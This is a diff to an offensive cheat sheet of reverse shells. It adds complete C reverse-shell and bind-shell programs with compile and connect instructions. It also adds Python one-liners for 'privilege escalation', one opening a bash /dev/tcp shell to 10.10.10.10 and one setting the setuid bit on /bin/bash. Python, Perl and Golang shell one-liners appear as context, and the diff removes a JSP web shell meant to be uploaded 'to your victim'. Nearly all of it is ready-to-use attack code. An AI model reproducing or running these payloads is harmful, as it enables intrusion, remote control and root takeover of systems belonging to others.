@@ -5,6 +5,7 @@ Basic reverse shells for any scenario
 
 - Python
 - Perl
+- C
 - Bash TCP
 - Bash UDP
 - PHP
@@ -20,8 +21,7 @@ Basic reverse shells for any scenario
 - NodeJS
 - TCLsh
 - Golang
-- JSP
-- Web.config
+
 
 # Python
 
@@ -31,6 +31,20 @@ One-Liner
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
 // Replace the IP & Port
+```
+
+One-Liner For Privilege Escalation
+```
+import os
+
+os.system('bash -c "bash -i >& /dev/tcp/10.10.10.10/9999 0>&1"')
+
+OR
+
+import os
+
+os.system('chmod +s /bin/bash')
+
 ```
 
 Script
@@ -60,6 +74,88 @@ One-Liner
 perl -e 'use Socket;$i="10.10.10.10";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
 
 // Replace IP & Port
+
+```
+
+# C
+
+Reverse Shell
+```
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+ 
+int main (int argc, char **argv)
+{
+  int scktd;
+  struct sockaddr_in client;
+ 
+  client.sin_family = AF_INET;
+  client.sin_addr.s_addr = inet_addr("10.10.10.10");
+  client.sin_port = htons(9999);
+
+  scktd = socket(AF_INET,SOCK_STREAM,0);
+  connect(scktd,(struct sockaddr *)&client,sizeof(client));
+
+  dup2(scktd,0); // STDIN
+  dup2(scktd,1); // STDOUT
+  dup2(scktd,2); // STDERR
+
+  execl("/bin/sh","sh","-i",NULL,NULL);
+
+  return 0;
+}
+
+// Replace IP & Port
+Compile: gcc rev.c -o rev
+
+```
+
+Bind Shell
+
+```
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+ 
+int main (int argc, char **argv)
+{
+  int scktd = -1;
+  int scktd_client = -1;
+  int i = -1;
+  struct sockaddr_in server;
+  struct sockaddr_in client;
+
+  scktd = socket(AF_INET,SOCK_STREAM,0);
+  if (scktd == -1)
+    return -1;
+
+  server.sin_family = AF_INET;
+  server.sin_addr.s_addr = INADDR_ANY;
+  server.sin_port = htons(9999);
+
+  if(bind(scktd,(struct sockaddr *)&server,sizeof(server)) < 0)
+    return -2;
+
+  listen(scktd,3);
+  i = sizeof(struct sockaddr_in);
+  scktd_client = accept(scktd,(struct sockaddr *)&client,(socklen_t*)&i);
+  if (scktd_client < 0)
+    return -3;
+
+  dup2(scktd_client,0); // STDIN
+  dup2(scktd_client,1); // STDOUT
+  dup2(scktd_client,2); // STDERR
+
+  execl("/bin/sh","sh","-i",NULL,NULL);
+
+  return 0;
+}
+
+// Replace Port
+Connect to Port: nc <ip> 9999
 
 ```
 
@@ -308,44 +404,5 @@ echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","
 
 ```
 
-# JSP
-
-```
-// Paste below in .jsp file and uplaod to your victim
-
-<%@ page
-import=”java.util.*,java.io.*”%>
-<%
-%>
-<HTML>
-<BODY>
-<H3>Basic JSP Shell</H3>
-<FORM METHOD=”GET” NAME=”myform”
-ACTION=”">
-<INPUT TYPE=”text” NAME=”cmd”>
-<INPUT TYPE=”submit” VALUE=”Execute”>
-</FORM>
-<PRE>
-<%
-if (request.getParameter(“cmd”) != null) {
-out.println(“Command: ” +
-request.getParameter(“cmd”) + “<BR>”);
-Process p =
-Runtime.getRuntime().exec(request.getParameter(“cmd”));
-OutputStream os = p.getOutputStream();
-InputStream in = p.getInputStream();
-DataInputStream dis = new DataInputStream(in);
-String disr = dis.readLine();
-while ( disr != null ) {
-out.println(disr);
-disr = dis.readLine();
-}
-}
-%>
-</PRE>
-</BODY>
-</HTML>
-
-```
 
 
